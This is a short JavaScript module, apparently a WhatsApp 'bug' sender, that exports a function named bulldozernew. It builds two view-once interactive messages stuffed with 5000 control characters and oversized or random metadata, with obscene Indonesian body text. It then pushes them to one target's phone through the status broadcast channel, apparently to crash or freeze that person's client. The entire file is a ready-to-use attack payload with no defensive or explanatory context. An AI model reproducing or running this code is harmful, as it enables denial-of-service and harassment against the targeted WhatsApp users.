// bulldozer.js
async function bulldozernew(hydro, target) {
    const OndetMsg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "B = BOKEP⟅༑", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(5000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const OndetMsg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "K = KONTOL ᝄ", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(5000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await hydro.relayMessage("status@broadcast", OndetMsg1.message, {
        messageId: OndetMsg1.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await hydro.relayMessage("status@broadcast", OndetMsg2.message, {
        messageId: OndetMsg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

module.exports = { bulldozernew };